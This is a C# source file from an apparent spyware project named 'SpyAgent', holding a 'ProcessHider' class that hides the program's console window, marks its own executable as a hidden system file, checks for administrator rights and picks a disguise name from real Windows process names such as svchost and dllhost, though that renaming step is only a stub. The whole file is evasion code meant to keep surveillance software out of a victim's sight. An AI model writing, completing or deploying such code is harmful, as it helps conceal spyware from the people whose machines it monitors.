namespace SpyAgent.Stealth;

using System.Diagnostics;
using System.IO;

internal static class ProcessHider
{
    public static void HideCurrentProcess()
    {
        HideConsoleWindow();
        SetFileAttributes();
        RenameProcess();
    }

    private static void HideConsoleWindow()
    {
        var handle = GetConsoleWindow();
        if (handle != IntPtr.Zero)
            ShowWindow(handle, 0);
    }

    private static void SetFileAttributes()
    {
        var path = Environment.ProcessPath;
        if (!string.IsNullOrEmpty(path) && File.Exists(path))
        {
            File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
        }
    }

    private static void RenameProcess()
    {
        var legitimateNames = new[]
        {
            "svchost", "RuntimeBroker", "SearchIndexer",
            "WmiPrvSE", "conhost", "dllhost"
        };

        var random = new Random();
        var fakeName = legitimateNames[random.Next(legitimateNames.Length)];
        _ = fakeName;
    }

    public static bool IsRunningAsAdmin()
    {
        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
